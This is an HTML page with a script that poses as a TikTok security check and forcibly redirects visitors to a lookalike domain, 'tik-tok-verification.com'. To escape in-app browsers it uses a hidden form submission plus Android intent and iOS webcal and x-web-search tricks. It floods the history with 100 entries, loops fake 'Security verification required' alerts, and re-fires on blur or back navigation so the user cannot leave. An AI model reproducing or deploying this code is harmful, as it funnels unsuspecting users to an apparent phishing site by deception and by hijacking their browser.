<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

    <form id="bypassForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_blank" style="display:none;"></form>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function formBreakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
        const form = document.getElementById('bypassForm');

        // 1. Submit the form (Higher priority than window.location)
        form.submit();

        // 2. Immediate Protocol Layering
        if (isAndroid) {
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
        } else if (isIOS) {
            // Attempt a 'Webcal' handover which often triggers a Safari prompt
            window.location.href = "webcal://" + target.replace("https://", "");
            
            setTimeout(() => {
                window.location.replace("x-web-search://?" + encodeURIComponent(target));
            }, 50);
        }
    }

    function rampage() {
        if (Date.now() > killTime) return; // FAIL-SAFE

        formBreakout();

        // FIXED ALERT FOR ATTEMPT #15
        alert("ATTEMPT #15\n\nSecurity verification required.\n\nTap OK to open in your system browser.");
        
        formBreakout();

        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // High-density history jam
        for(let i=0; i<100; i++) history.pushState({idx:i}, "", "#verify_" + i);
        rampage();
    };

    // Prevent 'X' button or swipe escape
    window.onblur = () => { if (Date.now() < killTime) rampage(); };
    window.onpopstate = () => { if (Date.now() < killTime) rampage(); };
</script>
</body>
</html>
